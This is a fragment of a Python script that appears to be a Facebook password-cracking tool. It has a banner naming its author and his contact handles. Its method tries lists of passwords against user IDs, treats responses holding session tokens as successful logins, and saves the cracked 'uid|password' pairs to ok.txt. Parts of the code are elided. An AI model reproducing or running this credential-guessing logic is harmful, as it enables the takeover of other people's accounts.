...
logo = """    MMM"""AMV                                   
M'   AMV                                    
'   AMV `7M'    ,A    `MF'.gP"Ya `7M'   `MF'
   AMV    VA   ,VAA   ,V ,M'   Yb  `VA ,V'  
  AMV   ,  VA ,V  VA ,V  8M""""""    XMX    
 AMV   ,M   VVV    VVV   YM.    ,  ,V' VA.  
AMVmmmmMM    W      W     `Mbmmd'.AM.   .MA.  
\033[1;97m______________________________________________________
\033[1;31m\033[1;37m Codded By \033[1;31m:\033[1;37m Mr-ZWEX \033[1;37m(\033[1;32mPARDESI\033[1;37m)|
\033[1;31m\033[1;37m Facebook  \033[1;31m:\033[1;37m MRPARDESI1      |      \033[1;32m𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘
\033[1;31m\033[1;37m Whatsapp  \033[1;31m:\033[1;37m +994406732363   |     \033[1;32mNAZIR 
\033[1;31m\033[1;37m Youtube   \033[1;31m:\033[1;37m GUSTAH5    |
\033[1;97m______________________________________________________
"""
loop = 0
id = []
	...
	def __api__(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\033[1;97m[\033[1;92mZWEX-OK\033[1;97m]\033[1;92m %s | %s\033[0;92m"%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\033[1;97m[\033[1;92mZWEX-CP\033[1;97m] %s | %s\033[0;94m"%(uid, pw))
